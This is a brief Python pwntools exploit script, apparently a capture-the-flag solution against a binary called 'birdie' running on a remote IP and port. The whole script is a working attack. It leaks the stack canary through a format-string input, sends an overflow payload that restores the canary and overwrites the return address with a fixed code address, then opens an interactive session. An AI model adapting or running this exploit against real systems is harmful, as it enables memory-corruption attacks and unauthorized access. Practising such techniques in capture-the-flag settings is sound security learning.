#!/usr/bin/env python3

import pwn

#p = pwn.process('birdie')
p = pwn.remote('34.121.211.139', 1111)
#pwn.gdb.attach(p, 'b *0x400861')
p.recvuntil('name\n')
p.sendline("%15$llx")
stack_canary = int(p.recvline(), 16)
print(hex(stack_canary))

p.recvuntil('payload\n')
payload  = b"A"*64
payload += pwn.p64(stack_canary)
payload += pwn.p64(stack_canary)
payload += pwn.p64(0x42424242)
payload += pwn.p64(0x400877)
p.sendline(payload)
p.interactive()
